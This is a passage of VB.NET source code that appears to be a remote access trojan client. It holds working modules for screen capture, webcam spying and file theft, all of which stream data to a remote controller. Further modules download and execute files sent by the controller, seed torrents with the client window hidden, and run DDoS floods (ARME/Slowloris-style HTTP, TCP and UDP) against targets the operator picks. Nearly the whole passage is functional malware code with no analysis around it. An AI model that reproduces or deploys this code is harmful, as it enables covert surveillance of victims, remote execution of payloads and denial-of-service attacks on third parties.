            SendThread.Start()
            Thread.Sleep(500)
        Catch ex As Exception

        End Try
    End Sub
#End Region

#Region "Take Screenshot with APIs"
    Public Shared Function TakeAPIscreenshot() As Image
        Try
            Dim hSDC, hMDC As Integer
            Dim hBMP, hBMPOld As Integer
            Dim r As Integer
            hSDC = CreateDC("DISPLAY", "", "", "")
            hMDC = CreateCompatibleDC(hSDC)
            FW = GetDeviceCaps(hSDC, 8)
            FH = GetDeviceCaps(hSDC, 10)
            hBMP = CreateCompatibleBitmap(hSDC, FW, FH)
            hBMPOld = SelectObject(hMDC, hBMP)
            Dim bounds As Rectangle
            bounds = Src.Bounds
            r = BitBlt(hMDC, 0, 0, bounds.Width, bounds.Height, hSDC, bounds.X, bounds.Y, 13369376)
            hBMP = SelectObject(hMDC, hBMPOld)
            r = DeleteDC(hSDC)
            r = DeleteDC(hMDC)
            TakeAPIscreenshot = Image.FromHbitmap(New IntPtr(hBMP))
            DeleteObject(hBMP)
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
#End Region

#Region "Take screenshot with GDI+"
    Public Shared Function TakeScreenshotWithGDI() As Image
        Try
            Const PFormat As PixelFormat = PixelFormat.Format24bppRgb
            Dim bounds As Rectangle
            Dim screenshot As Bitmap
            Dim graph As Graphics
            bounds = Src.Bounds
            screenshot = New Bitmap(bounds.Width, bounds.Height, PFormat)
            graph = Graphics.FromImage(screenshot)
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
            If ShowCursor = 2 Then
                Dim cursorBmp As Bitmap = CaptureCursor(X, Y)
                graph.DrawImage(cursorBmp, x, y)
                cursorBmp.Dispose()
            End If
            graph.Dispose()
            Return screenshot
        Catch
            Return Nothing
        End Try
    End Function
#End Region

#Region "Get cursor coordinates"
    Function ReturnCur() As Bitmap
        On Error Resume Next
        Dim hicon As IntPtr
        Dim ci As CURSORINFO = New CURSORINFO()
        Dim icInfo As ICONINFO
        ci.cbSize = Marshal.SizeOf(ci)
        If GetCursorInfo(ci) Then
            hicon = CopyIcon(ci.hCursor)
            If GetIconInfo(hicon, icInfo) Then
                Return Icon.FromHandle(hicon).ToBitmap
            End If
        End If
        Return Nothing
    End Function
#End Region

#Region "Screenshot sending thread"


#Region "Cursor"
    <DllImport("dwmapi.dll", PreserveSig:=False)> _
    Public Shared Function DwmIsCompositionEnabled() As Boolean
    End Function
    <DllImport("dwmapi.dll", PreserveSig:=False)> _
    Public Shared Sub DwmEnableComposition(ByVal bEnable As Boolean)
    End Sub
    Private Sub DisableAero()
        Try
            DwmEnableComposition(False)
        Catch ex As Exception
        End Try
    End Sub
    Private Shared Function CaptureCursor(ByRef x As Integer, ByRef y As Integer) As Bitmap
        On Error Resume Next
        Dim bmp As Bitmap
        Dim hicon As IntPtr
        Dim ci As New CURSORINFO()
        Dim icInfo As ICONINFO
        ci.cbSize = Marshal.SizeOf(ci)
        If GetCursorInfo(ci) Then
            hicon = CopyIcon(ci.hCursor)
            If GetIconInfo(hicon, icInfo) Then
                x = ci.ptScreenPos.X - CInt(icInfo.xHotspot)
                y = ci.ptScreenPos.Y - CInt(icInfo.yHotspot)
                Dim ic As Icon = Icon.FromHandle(hicon)
                bmp = ic.ToBitmap()
                ic.Dispose()
                Return bmp
            End If
        End If
        Return Nothing
    End Function
#End Region

    Dim motionDetection As MotionDetection
    Private Sub SendScreenThread()
        Dim trafficStream As Stream
        Try
            connectionClient = New TcpClient(remoteHost, RemotePort)
            connectionClient.SendBufferSize = 1024
            trafficStream = connectionClient.GetStream()
            connectionClient.Client.Send(System.Text.Encoding.UTF8.GetBytes(Chr(RemoteDesktop) & SplitMark1 & connectionId))
            connectionClient.SendBufferSize = 102400
            motionDetection = New MotionDetection()
            Dim DesktopImage As Image
            Do While connectionClient.Connected
                Try
                    DesktopImage = TakeScreenshotWithGDI()

                    Dim stream As New MemoryStream
                    motionDetection.Encode(DesktopImage, stream, Quality)
                    stream.Position = 0
                    If stream.Length > 0 Then
                        trafficStream.Write(BitConverter.GetBytes(CInt(stream.Length)), 0, 4)
                        trafficStream.Write(stream.GetBuffer(), 0, stream.Length)
                    End If
                    stream.Dispose()
                    stream.Close()
                Catch ex As Exception
                    motionDetection.lastBitmap = Nothing
                    DesktopImage = Nothing
                    motionDetection.decodeBitmap = Nothing
                End Try
            Loop
            oldimage = Nothing
            motionDetection.lastBitmap = Nothing
            motionDetection.decodeBitmap = Nothing
            DesktopImage = Nothing
            connectionClient.GetStream.Close()
            connectionClient.Close()
            trafficStream.Close()
            trafficStream.Dispose()
            connectionClient = Nothing
            GC.Collect()
            Exit Sub
        Catch ex As Exception
            SendStatus("Remote desktop stopped...")
            Try
                motionDetection.lastBitmap = Nothing
                motionDetection.decodeBitmap = Nothing
                connectionClient.GetStream.Close()
                connectionClient.Close()
                connectionClient = Nothing
                trafficStream.Close()
                trafficStream.Dispose()
                GC.Collect()
            Catch
            End Try
        End Try
    End Sub
#End Region

End Class

#End Region

#Region " Webcam "

Public Class Webcam

#Region "Apis"
    Private Declare Function BitBlt Lib "GDI32" (ByVal srchDC As Integer, ByVal srcX As Integer, ByVal srcY As Integer, ByVal srcW As Integer, ByVal srcH As Integer, ByVal desthDC As Integer, ByVal destX As Integer, ByVal destY As Integer, ByVal op As Integer) As Integer
    Public Const WM_CAP As Short = &H400S
    Public Const WS_VISIBLE As Integer = &H10000000
    Public Const WS_CHILD As Integer = &H40000000
    Public Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
    Public Const WM_CAP_COPY As Integer = 1054
    Public Const WM_CAP_GET_FRAME As Integer = 1084
    Public Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11
    Const GWLP_HWNDPARENT As Integer = -8
    Const WM_CAP_SET_PREVIEW As Integer = WM_CAP + 50
    Const WM_CAP_SET_PREVIEWRATE As Integer = WM_CAP + 52
    Const WM_CAP_SET_SCALE As Integer = WM_CAP + 53
    Const SWP_NOMOVE As Short = &H2S
    Const SWP_NOZORDER As Short = &H4S
    Const HWND_BOTTOM As Short = 1
    Public Declare Function DestroyWindow Lib "user32" (ByVal hndw As Integer) As Boolean
    Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
        (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, _
        <MarshalAs(UnmanagedType.AsAny)> ByVal lParam As Object) As Integer
    Public Declare Function capCreateCaptureWindowA Lib "avicap32.dll" _
      (ByVal lpszWindowName As String, ByVal dwStyle As Integer, _
      ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, _
      ByVal nHeight As Short, ByVal hWndParent As Integer, _
      ByVal nID As Integer) As Integer
    Dim hHwnd As Integer
    Private Function SetWindowLongW(ByVal hWnd As HandleRef, ByVal nIndex As Integer, ByVal dwNewLong As IntPtr) As Integer
    End Function
#End Region

#Region "Declarations & Enums"
    Private webcamFrame As Image
    Private Const webcamByte = 3
    Private dataThread As Thread
    Public Shared webcamSocket As TcpClient
    Public Shared imageQuality As Integer = 55
    Public Shared imageResize As Double = 1
    Public Shared Compression As Compressions
    Public Shared connectionId As Integer
    Public Shared remoteIp As String
    Public Shared remotePort As Integer
    Public Shared jpegByteSize As String
    Dim F As Windows.Forms.Form
    Dim picCapture As Windows.Forms.PictureBox
    Dim consoleHWnd As IntPtr
    Public Structure Compressions
        Dim UseLZW As Integer
        Dim UseRLE As Integer
    End Structure
#End Region

    Public Sub New(ByVal serverID As Integer, ByVal IP As String, ByVal port As String, ByVal commandString As String, ByVal device As String)
        Try
            allDevices = New FilterInfoCollection(FilterCategory.VideoInputDevice)
            remoteIp = IP
            remotePort = port
            connectionId = serverID
            imageQuality = Int(Asc(commandString.Substring(0, 1)))
            iDevice = CInt(device)
            Compression.UseLZW = Asc(commandString.Substring(1, 1))
            Compression.UseRLE = Asc(commandString.Substring(2, 1))
            Dim t As New Thread(AddressOf OpenCamWindow)
            t.Start()
        Catch ex As Exception
        End Try
    End Sub
    Dim frame As Bitmap
    Dim allDevices As FilterInfoCollection
    Dim webcam As VideoCaptureDevice
    Sub video_NewFrame(ByVal sender As Object, eventArgs As NewFrameEventArgs)
        frame = CType(eventArgs.Frame.Clone(), Bitmap)
        GC.Collect()
    End Sub
    Public Sub OpenWebcam()
        Dim dataStream As Stream = Nothing
        Try
            webcamSocket = New TcpClient(remoteHost, remotePort)
            webcamSocket.SendBufferSize = 1024
            dataStream = webcamSocket.GetStream()
            webcamSocket.Client.Send(System.Text.Encoding.Default.GetBytes(Chr(webcamByte) & SplitMark1 & connectionId & SplitMark1))
            webcamSocket.SendBufferSize = 10240
            Do While webcamSocket.Connected
                If webcam.IsRunning Then
                    webcamFrame = ImageManaging.ConvertToJpeg(frame.Clone, imageQuality)
                    Dim b As BinaryFormatter = New BinaryFormatter
                    b.Serialize(dataStream, webcamFrame)
                End If
            Loop
            webcam.SignalToStop()
            webcam.WaitForStop()
            webcam = Nothing
            If webcamSocket.GetStream IsNot Nothing Then
                webcamSocket.GetStream.Close()
            End If
            webcamSocket.Close()
            dataStream.Close()
            dataStream.Dispose()
            GC.Collect()
            Exit Sub
        Catch ex As Exception
            Try
                webcam.SignalToStop()
                webcam.WaitForStop()
                webcam = Nothing
                GC.Collect()
                If webcamSocket.GetStream IsNot Nothing Then
                    webcamSocket.GetStream.Close()
                End If
                webcamSocket.Close()


                dataStream.Close()
                dataStream.Dispose()

            Catch
            End Try
        End Try
    End Sub

    Dim iDevice As Integer = 0

    Public Sub OpenCamWindow()
        Try
            webcam = New VideoCaptureDevice(allDevices(iDevice).MonikerString)
            AddHandler webcam.NewFrame, AddressOf video_NewFrame
            '  webcam.DesiredFrameSize = New Size(320, 240)
            'videoSource.DesiredFrameRate = 20
            webcam.Start()
            Do
                If webcam.IsRunning Then
                    If frame Is Nothing Then
                        GC.Collect()
                    Else
                        dataThread = New Thread(AddressOf OpenWebcam)
                        dataThread.IsBackground = True
                        dataThread.SetApartmentState(ApartmentState.STA)
                        dataThread.Start()
                        GC.Collect()
                        Exit Do
                    End If
                Else
                    Exit Do

                End If
            Loop
        Catch ex As Exception
            Exit Sub

        End Try



        'On Error Resume Next
        'F = New Form
        'F.Size = New Size(422, 253)
        'F.ShowInTaskbar = False
        'picCapture = New PictureBox
        'picCapture.BackColor = Color.Black
        'picCapture.Location = New Point(12, 90)
        'picCapture.Name = "picCapture"
        'picCapture.Size = New Size(422, 253)
        'picCapture.SizeMode = Windows.Forms.PictureBoxSizeMode.AutoSize
        'picCapture.TabIndex = 3
        'picCapture.Dock = DockStyle.Fill
        'F.Opacity = 0
        'picCapture.TabStop = False
        'F.Controls.Add(picCapture)
        'SetWindowLongW(New HandleRef(F, F.Handle), GWLP_HWNDPARENT, consoleHWnd)
        'F.Visible = False
        'F.Opacity = 0
        'AddHandler F.Load, AddressOf Load
        'Application.Run(F)
        'F.Hide()
        'SetWindowLongW(New HandleRef(F, F.Handle), GWLP_HWNDPARENT, consoleHWnd)
    End Sub
    Public Sub Load(ByVal sender As System.Object, ByVal e As System.EventArgs)
        On Error Resume Next
        OpenPreviewWindow()
        dataThread = New Thread(AddressOf OpenWebcam)
        dataThread.IsBackground = True
        dataThread.SetApartmentState(ApartmentState.STA)
        dataThread.Start()
        F.Hide()
    End Sub
    Private Sub OpenPreviewWindow()
        Try
            hHwnd = capCreateCaptureWindowA(iDevice, WS_VISIBLE Or WS_CHILD, 0, 0, 640, 480, picCapture.Handle.ToInt32, 0)
            If SendMessage(hHwnd, WM_CAP_DRIVER_CONNECT, iDevice, 0) Then
                SendMessage(hHwnd, WM_CAP_SET_SCALE, True, 0)
                SendMessage(hHwnd, WM_CAP_SET_PREVIEWRATE, 66, 0)
                SendMessage(hHwnd, WM_CAP_SET_PREVIEW, True, 0)
                SetWindowPos(hHwnd, HWND_BOTTOM, 0, 0, picCapture.Width, picCapture.Height, SWP_NOMOVE Or SWP_NOZORDER)
                F.Location = New Point(My.Computer.Screen.Bounds.Width + 100, My.Computer.Screen.Bounds.Height - 350)
            Else
                DestroyWindow(hHwnd)
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public Function CaptureCam() As Image
        Try
            Return copyIt
        Catch
            Return Nothing
            'SendMessage(hHwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            'DestroyWindow(hHwnd)
        End Try
    End Function
    Public ReadOnly Property copyIt() As Image
        Get
            Return copyFrame1(picCapture, New RectangleF(0, 0, picCapture.Width, picCapture.Height))
        End Get
    End Property
    Public Function copyFrame1(ByVal src As PictureBox, ByVal rect As RectangleF) As Bitmap
        Try
            Dim srcPic As Graphics = src.CreateGraphics
            Dim srcBmp As New Bitmap(src.Width, src.Height, srcPic)
            Dim srcMem As Graphics = Graphics.FromImage(srcBmp)
            Dim HDC1 As IntPtr = srcPic.GetHdc
            Dim HDC2 As IntPtr = srcMem.GetHdc
            BitBlt(HDC2, 0, 0, CInt(rect.Width), CInt(rect.Height), HDC1, CInt(rect.X), CInt(rect.Y), 13369376)
            copyFrame1 = CType(srcBmp.Clone(), Bitmap)
            srcPic.ReleaseHdc(HDC1)
            srcMem.ReleaseHdc(HDC2)
            srcPic.Dispose()
            srcMem.Dispose()
        Catch ex As Exception
            copyFrame1 = Nothing
        End Try
    End Function
    Public Function copyFrame(ByVal CamWnd As IntPtr, ByVal rect As RectangleF) As Bitmap
        Try
            Dim srcPic As Graphics = Graphics.FromHwnd(CamWnd)
            Dim srcBmp As New Bitmap(250, 180, srcPic)
            Dim srcMem As Graphics = Graphics.FromImage(srcBmp)
            Dim HDC1 As IntPtr = srcPic.GetHdc
            Dim HDC2 As IntPtr = srcMem.GetHdc
            BitBlt(HDC2, 0, 0, CInt(rect.Width), CInt(rect.Height), HDC1, CInt(rect.X), CInt(rect.Y), 13369376)
            copyFrame = CType(srcBmp.Clone(), Bitmap)
            srcPic.ReleaseHdc(HDC1)
            srcMem.ReleaseHdc(HDC2)
            srcPic.Dispose()
            srcMem.Dispose()
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
End Class

#End Region

#Region " Quick Transfer "
Public Class QuickTransfer
    Private Const UploadExec = 76
    Private TransferSocket As TcpClient
    Private TransferThread As Thread
    Private LocalPath As String = Nothing
    Private TransferStream As NetworkStream
    Private Const StatusDownloading = &H1
    Private Const StatusDownloadError = &H3
    Private Const StatusDownloadedExecuting = &H4
    Private Const StatusExecuted = &H5
    Private Const StatusExecuteError = &H6
    Private Const DLStatus = 87
    Private Update As Integer = 0
    Public Sub New(ByVal DownloadSettings As String)
        Try
            Dim ID As String = DownloadSettings.Split(SplitMark1)(1)
            Dim RemotePath As String = DownloadSettings.Split(SplitMark1)(2)
            Dim FileName As String = DownloadSettings.Split(SplitMark1)(3)
            Update = Asc(DownloadSettings.Split(SplitMark1)(4))
            LocalPath = Path.GetTempFileName & FileName
            TransferSocket = New TcpClient()
            TransferSocket.Connect(compilerSettings.remoteHost, compilerSettings.remotePort)
            TransferSocket.Client.Send(System.Text.Encoding.UTF8.GetBytes(Chr(UploadExec) & SplitMark1 & ID & SplitMark1 & RemotePath))
            TransferSocket.Client.SendBufferSize = 20480
            TransferThread = New Thread(AddressOf Transfer)
            TransferThread.IsBackground = True
            TransferThread.SetApartmentState(ApartmentState.STA)
            TransferThread.Start()
        Catch
            Send(Chr(DLStatus) & Chr(StatusDownloadError))
        End Try
    End Sub
    Public Sub Transfer()
        Try
            Dim FileToReceive As New FileStream(LocalPath, FileMode.Create, FileAccess.Write)
            Dim BytesRead As Integer = 0
            Dim TempFileBuffer(20480) As Byte
            TransferStream = TransferSocket.GetStream
            Send(Chr(CommandType.downloaderStatus) & Chr(StatusDownloading))
            While True
                BytesRead = TransferStream.Read(TempFileBuffer, 0, TempFileBuffer.Length)
                If BytesRead = 0 Then Exit While
                FileToReceive.Write(TempFileBuffer, 0, BytesRead)
                FileToReceive.Flush()
            End While
            FileToReceive.Close()
            TransferSocket.GetStream.Close()
            TransferSocket.Close()
            If Update <> 2 Then
                Exec()
            Else
                UpdateExecute()
                MainModule.Send(Chr(MainModule.CommandType.downloaderStatus) & Chr(StatusExecuted))
            End If
        Catch ex As Exception

            Send(Chr(CommandType.downloaderStatus) & Chr(StatusDownloadError))
            Try
                TransferSocket.GetStream.Close()
                TransferSocket.Close()
            Catch

            End Try
        End Try
    End Sub

    Public Sub UpdateExecute()
        On Error Resume Next
        Process.Start(LocalPath)
        End
    End Sub
    Public Sub Exec()
        MainModule.Send(Chr(MainModule.CommandType.downloaderStatus) & Chr(StatusDownloadedExecuting))
        Try
            Dim p As Process = Process.Start(LocalPath)
            MainModule.Send(Chr(MainModule.CommandType.downloaderStatus) & Chr(StatusExecuted))
        Catch
            MainModule.Send(Chr(MainModule.CommandType.downloaderStatus) & Chr(StatusExecuteError))
        End Try
    End Sub
End Class

#End Region

#Region " Transfer "
Public Class Transfer
    Private TransferSocket As TcpClient
    Private TransferThread As Thread
    Private LocalPath As String = Nothing
    Private TransferStream As NetworkStream
    Private Const Send = 74
    Private Const Receive = 75
    Private Const Unknown = 0
    Private TransferType As Integer = 0
    Public Sub New(ByVal genericInfo As String)
        Try
            TransferType = Asc(genericInfo.Split(SplitMark1)(0))
            Dim RemotePath As String = genericInfo.Split(SplitMark1)(1)
            LocalPath = genericInfo.Split(SplitMark1)(2)
            Dim ID As Integer = genericInfo.Split(SplitMark1)(3)

            Dim Size As Integer = 0

            If TransferType = Receive Then
                Size = New FileInfo(LocalPath).Length
                If Size > 0 And Size < 1024 Then
                    Size = 1024
                End If
            End If
            If TransferType = 0 Then Exit Sub
            TransferSocket = New TcpClient()
            TransferSocket.Connect(compilerSettings.remoteHost, compilerSettings.remotePort)
            TransferSocket.Client.Send(System.Text.Encoding.UTF8.GetBytes(Chr(TransferType) & MainModule.SplitMark1 & ID & MainModule.SplitMark1 & RemotePath & MainModule.SplitMark1 & Size & MainModule.SplitMark1 & LocalPath))
            TransferSocket.Client.SendBufferSize = 20480
            TransferThread = New Thread(AddressOf Transfer)
            TransferThread.IsBackground = True
            TransferThread.SetApartmentState(ApartmentState.STA)
            TransferThread.Start()

        Catch
        End Try
    End Sub
    Public Sub Transfer()
        Try
            Select Case TransferType
                Case Send
                    Dim FileToReceive As New FileStream(LocalPath, FileMode.Create, FileAccess.Write)
                    Dim BytesRead As Integer = 0
                    Dim TempFileBuffer(20480) As Byte
                    TransferStream = TransferSocket.GetStream
                    While True
                        BytesRead = TransferStream.Read(TempFileBuffer, 0, TempFileBuffer.Length)
                        If BytesRead = 0 Then Exit While
                        FileToReceive.Write(TempFileBuffer, 0, BytesRead)
                        FileToReceive.Flush()
                    End While
                    TransferSocket.GetStream.Close()
                    FileToReceive.Close()
                    TransferSocket.Close()
                Case Receive
                    Dim FileToSend As New FileStream(LocalPath, FileMode.Open, FileAccess.Read)
                    Dim BytesRead As Integer = 0
                    Dim TempFileBuffer(20480) As Byte
                    TransferStream = TransferSocket.GetStream
                    While True
                        BytesRead = FileToSend.Read(TempFileBuffer, 0, TempFileBuffer.Length)
                        If BytesRead = 0 Then Exit While
                        TransferStream.Write(TempFileBuffer, 0, BytesRead)
                        TransferStream.Flush()
                    End While
                    FileToSend.Close()
                    TransferSocket.GetStream.Close()
                    TransferSocket.Close()
                Case Unknown
                    TransferSocket.GetStream.Close()
                    TransferSocket.Close()
            End Select
        Catch ex As Exception
            Try
                If ex.Message.Contains("is denied") Then
                    MainModule.Send(Chr(MainModule.CommandType.ErrorHandler) & 1 & MainModule.SplitMark1 & ex.Message)
                    TransferSocket.GetStream.Close()
                    TransferSocket.Close()
                End If
                TransferSocket.GetStream.Close()
                TransferSocket.Close()
            Catch
            End Try
        End Try
    End Sub
End Class

#End Region

#Region " Seeder "
Public Class Seeder
    <DllImport("user32.dll")> Private Shared Function ShowWindow(ByVal hwnd As Integer, ByVal nCmdShow As Integer) As Integer
    End Function
    Public Shared UTorrentPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\uTorrent\uTorrent.exe"
    Public Shared UTorrentLocalPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\uTorrent\uTorrent.exe"
    Public Shared BitTorrentPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\BitTorrent\bittorrent.exe"
    Public Shared BitLocalPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\BitTorrent\BitTorrent.exe"
    Public Shared VuzePath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\Vuze\Azureus.exe"
    Public Shared VuzeLocalPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Azureus\torrents\"

    Public Sub New(ByVal path As String)
        On Error Resume Next
        If IsVuze() Then
            SeedItVuze(VuzePath, path)
            Send(Chr(136) & MainModule.SplitMark1 & "Seeding file " & GetFileNameFromURL(path) & " with Vuze")
        ElseIf IsBitTorrent() Then
            SeedIt(BitLocalPath, BitLocalPath, path)
            MainModule.Send(Chr(136) & MainModule.SplitMark1 & "Seeding file " & GetFileNameFromURL(path) & " with BitTorrent")
        ElseIf IsUtorrent() Then
            SeedIt(UTorrentPath, UTorrentLocalPath, path)
            MainModule.Send(Chr(136) & MainModule.SplitMark1 & "Seeding file " & GetFileNameFromURL(path) & " with ?Torrent")
        Else
            MainModule.Send(Chr(136) & MainModule.SplitMark1 & "Failed to seed, torrent client not installed.")
        End If
    End Sub
    Public Function GetFileNameFromURL(ByVal URL As String) As String
        Try
            Return URL.Substring(URL.LastIndexOf("/", System.StringComparison.Ordinal) + 1)
        Catch ex As Exception
            Return URL
        End Try
    End Function
    Public Shared Function IsUtorrent() As Boolean
        On Error Resume Next
        If File.Exists(UTorrentPath) Then
            Return True
        End If
        Return False
    End Function

    Public Shared Function IsBitTorrent() As Boolean
        On Error Resume Next
        If File.Exists(BitLocalPath) Then
            Return True
        End If
        Return False
    End Function

    Public Shared Function IsVuze() As Boolean
        On Error Resume Next
        If File.Exists(VuzePath) Then
            Return True
        End If
        Return False
    End Function

    Public Shared Sub SeedIt(ByVal ClientPath As String, ByVal LocalPath As String, ByVal TorrentPath As String)
        On Error Resume Next
        Dim seed As New ProcessStartInfo()
        seed.FileName = ClientPath
        seed.Arguments = "/DIRECTORY " & LocalPath & " " & TorrentPath
        seed.CreateNoWindow = True
        Dim p As Process = Process.Start(seed)
        If ClientPath.Contains("uTorrent") Then
            HideIt("uTorrent")
        ElseIf ClientPath.Contains("BitTorrent") Then
            HideIt("BitTorrent")
        ElseIf ClientPath.Contains("Azureus") Then
            HideIt("Azureus")
        End If
    End Sub

    Public Shared Sub SeedItVuze(ByVal ClientPath As String, ByVal TorrentURL As String)
        On Error Resume Next
        Dim seed As New ProcessStartInfo()
        seed.FileName = ClientPath
        seed.Arguments = TorrentURL
        seed.CreateNoWindow = True
        Dim p As Process = Process.Start(seed)
        HideIt(p.MainWindowHandle)
        Thread.Sleep(1000)
    End Sub

    Public Shared Sub HideIt(ByVal TorrentClient As String)
        On Error Resume Next
        Thread.Sleep(1000)
        Dim P As Process() = Process.GetProcessesByName(TorrentClient)
        ShowWindow(P(0).MainWindowHandle.ToInt32, 0)
    End Sub
End Class
#End Region

#Region " Stress testing "
Public Class StressTesting
    Public Shared Flooding As Boolean = False
    Public Shared ThreadList As New List(Of Thread)()
    Public Sub StartFlood(ByVal T As FloodType, ByVal I As String, ByVal P As Integer)
        Try
            IP = I
            Port = P
            Select Case T
                Case FloodType.ARME
                    InitArme()
                    Send(Chr(140) & SplitMark1 & "Flooding with ARME. IP: " & I & " Port: " & P)
                Case FloodType.SLOWLORIS
                    InitArme()
                    Send(Chr(140) & SplitMark1 & "Flooding with Slowloris. IP: " & I & " Port: " & P)
                Case FloodType.TCP
                    StartTCP()
                    Send(Chr(140) & SplitMark1 & "Flooding with TCP. IP: " & I & " Port: " & P)
                Case FloodType.UDP
                    StartUdp()
                    Send(Chr(140) & SplitMark1 & "Flooding with UDP. IP: " & I & " Port: " & P)
            End Select
        Catch ex As Exception

        End Try

    End Sub

#Region "ARME"
    Public Sub StopArme()
        On Error Resume Next
        Flooding = False
        ThreadList.Clear()
        For Each T As Thread In ThreadList
            If T.ThreadState <> Threading.ThreadState.Stopped Then
                Return
            End If
        Next
    End Sub
    Public Sub InitArme()
        On Error Resume Next
        For i As Integer = 0 To 80
            Flooding = True
            CheckForIllegalCrossThreadCalls = False
            ThreadList.Add((New Thread(New ThreadStart(AddressOf StartARME))))
            ThreadList(ThreadList.Count - 1).Start()
        Next
    End Sub
    Public Sub StartARME()

        Dim Shocks As Socket() = New Socket(50 - 1) {}
        Dim uri As New Uri(IP)
        For I As Integer = 0 To 50 - 1
            If Not Flooding Then
                GoTo ENDLOOP
            End If
            Shocks(I) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        Next
        While True
            If Not Flooding Then
                GoTo ENDLOOP
            End If
            For I As Integer = 0 To 50 - 1
                If Not Flooding Then
                    GoTo ENDLOOP
                End If
                If Not Shocks(I).Connected Then
RETRY_CONNECT:
                    If Not Flooding Then
                        GoTo ENDLOOP
                    End If
                    Try
                        Shocks(I) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        Shocks(I).Connect(Dns.GetHostAddresses(uri.Host)(0), 80)
                        Shocks(I).Send(System.Text.Encoding.ASCII.GetBytes("HEAD / HTTP/1.1\r\nHost: $ARGV[0]\r\nRange:bytes=0-$p\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n"), SocketFlags.None)
                    Catch ex As Exception
                        If Not Flooding Then
                            GoTo ENDLOOP
                        End If
                        Thread.Sleep(1000)
                        GoTo RETRY_CONNECT
                    End Try
                End If
                If Not Flooding Then
                    GoTo ENDLOOP
                End If
            Next
            If Not Flooding Then
                GoTo ENDLOOP
            End If
[LOOP]:
            If Not Flooding Then
                GoTo ENDLOOP
            End If
            Try
                For i As Integer = 0 To 50 - 1
                    If Not Flooding Then
                        GoTo ENDLOOP
                    End If
                    Shocks(i).Send(System.Text.Encoding.ASCII.GetBytes("HEAD / HTTP/1.1\r\nHost: $ARGV[0]\r\nRange:bytes=0-$p\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n"), SocketFlags.None)
                Next
            Catch ex As Exception
            End Try
            Thread.Sleep(4000)
            If Not Flooding Then
                GoTo ENDLOOP
            End If
            GoTo [LOOP]
        End While
ENDLOOP:
        Try
            For i As Integer = 0 To 50 - 1
                If Shocks(i).Connected Then
                    Shocks(i).Close()
                    Shocks(i).Disconnect(False)
                End If
                Shocks(i) = Nothing
            Next
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Udp"
    Public Sub StartUdp()
        Udp.Host = IP
        Udp.Port = Port
        Udp.Threads = 50
        Udp.Socks = 10
        Udp.StartFlood()
    End Sub
    Public Sub StopUdp()
        Udp.StopFlood()
    End Sub
    Friend Class Udp
        Private Shared _floodingJob As ThreadStart()
        Private Shared _floodingThread As Thread()
        Private Shared _ipEo As IPEndPoint
        Private Shared _UdPcLass As SendPackets()
        Public Shared Host As String
        Public Shared IsEnabled As Boolean
        Public Shared Port As Integer
        Public Shared Socks As Integer
        Public Shared Threads As Integer

        Public Shared Sub StartFlood()
            Try
                Dim addressList As IPAddress() = Dns.GetHostEntry(Host).AddressList
                _ipEo = New IPEndPoint(addressList(0), Port)
            Catch
                Dim address As IPAddress = IPAddress.Parse(Host)
                _ipEo = New IPEndPoint(address, Port)
            End Try
            _floodingThread = New Thread(Threads - 1) {}
            _floodingJob = New ThreadStart(Threads - 1) {}
            _UdPcLass = New SendPackets(Threads - 1) {}
            For i As Integer = 0 To Threads - 1
                _UdPcLass(i) = New SendPackets(_ipEo, Socks)
                _floodingJob(i) = New ThreadStart(AddressOf _UdPcLass(i).Send)
                _floodingThread(i) = New Thread(_floodingJob(i))
                _floodingThread(i).Start()
            Next
            IsEnabled = True
        End Sub

        Public Shared Sub StopFlood()

            For i As Integer = 0 To Threads - 1
                Try
                    _floodingThread(i).Abort()
                    _floodingThread(i) = Nothing
                    _floodingJob(i) = Nothing
                    _UdPcLass(i) = Nothing
                Catch
                End Try
            Next
            IsEnabled = False
        End Sub


        Private Class SendPackets
            Private _sock As Socket()
            Private ipEo As IPEndPoint
            Private Socks As Integer

            Public Sub New(ByVal ipEo As IPEndPoint, ByVal shockets As Integer)
                On Error Resume Next
                Me.ipEo = ipEo
                Socks = shockets
            End Sub

            Private Shared Sub OnConnect(ByVal ar As IAsyncResult)
            End Sub

            Public Sub Send()

                While True
                    Dim num As Integer
                    Try
                        _sock = New Socket(Socks - 1) {}
                        For num = 0 To Socks - 1
                            _sock(num) = New Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Udp)
                            _sock(num).Blocking = False
                            _sock(num).BeginConnect(ipEo, New System.AsyncCallback(AddressOf OnConnect), _sock(num))
                        Next
                        Thread.Sleep(100)
                        For num = 0 To Socks - 1
                            If _sock(num).Connected Then
                                _sock(num).Disconnect(False)
                            End If
                            _sock(num).Close()
                            _sock(num) = Nothing
                        Next
                        _sock = Nothing
                    Catch
                        For num = 0 To Socks - 1
                            Try
                                If _sock IsNot Nothing Then
                                    If _sock(num).Connected Then
                                        Dim msg As Byte() = Encoding.UTF8.GetBytes("#############################%%%%%%%%%%%%%%%%%%%%^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
                                        Dim bytes As Byte() = New Byte(255) {}
                                        _sock(num).Send(msg, 0, msg.Length, SocketFlags.None)
                                        _sock(num).Disconnect(False)
                                    End If
                                    _sock(num).Close()
                                    _sock(num) = Nothing
                                End If
                            Catch
                            End Try
                        Next
                    End Try
                End While
            End Sub
        End Class

    End Class
#End Region
